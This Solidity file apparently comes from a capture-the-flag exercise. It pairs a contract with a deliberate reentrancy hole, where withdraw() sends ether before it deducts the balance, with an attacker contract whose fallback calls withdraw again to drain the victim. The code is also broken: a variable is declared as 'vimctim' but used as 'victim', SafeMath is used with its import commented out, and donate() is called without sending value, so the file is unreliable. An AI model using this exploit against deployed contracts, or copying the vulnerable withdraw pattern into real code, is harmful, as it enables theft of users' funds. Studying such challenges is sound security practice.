// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

//import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract attackContract{
address vimctim;
uint256 amount;
uint256 balance;
constructor(address _victim) payable{

victim = _victim;
balance = msg.value;
}




function attack(uint256 _amount) public {

    if(address(this).balance < _amount){
        revert();
    }
    amount = _amount;
Reentrance(victim).donate( _amount);

Reentrance(victim).withdraw(_amount);


}


receive() external payable { 


if(vimctim.balance > 0){

Reentrance(victim).withdraw(amount);



}




}






}